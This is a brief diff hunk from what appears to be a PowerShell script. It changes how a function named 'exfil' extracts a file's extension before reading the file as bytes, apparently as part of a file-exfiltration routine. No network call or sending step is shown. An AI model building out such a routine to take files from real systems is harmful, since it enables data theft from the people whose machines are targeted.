@@ -15,7 +15,7 @@ function exfil {
 
 		try {
 			# Get the name of the file
-   			$ext = [System.IO.Path]::GetExtension($filepath)
+   			$ext = [System.IO.Path]::GetExtension($filepath).TrimStart('.')
   		
 			# Read the file as a byte array
 			$bytes = [System.IO.File]::ReadAllBytes($FilePath)
